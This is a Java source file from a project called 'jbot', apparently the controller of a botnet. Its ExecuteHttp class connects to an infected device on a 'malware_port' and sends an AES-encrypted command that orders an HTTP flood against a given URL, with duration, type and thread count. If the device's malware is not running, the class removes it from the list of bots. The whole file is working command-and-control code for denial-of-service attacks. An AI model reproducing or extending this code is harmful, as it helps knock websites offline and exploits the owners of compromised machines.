package me.aaronakhtar.jbot.threads.execute.threads;

import me.aaronakhtar.jbot.JBot;
import me.aaronakhtar.jbot.Options;
import me.aaronakhtar.jbot.crypto.Aes;
import me.aaronakhtar.jbot.objects.Device;

import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ExecuteHttp implements Runnable{

    private String url;
    private int time;
    private String type;
    private Device device;
    private int threads;

    public ExecuteHttp(String url, int time, String type, int threads, Device device) {
        this.url = url;
        this.time = time * 1000;
        this.type = type;
        this.threads = threads;
        this.device = device;
    }

    @Override
    public void run() {
        try{
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(device.getInetAddress(), Options.malware_port), 5000);
            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
            writer.println(Aes.encrypt("http " + url.replaceAll(":", ";") + ":" + time + ":" + type + ":" + threads, Options.secret_key));
            writer.flush();
            writer.close();
            socket.close();
        }catch (Exception e){
            if (JBot.isUnderDev){
                e.printStackTrace();
            }

            if (!device.isMalwareRunning()){
                JBot.devices.remove(device);
            }

        }
    }
}
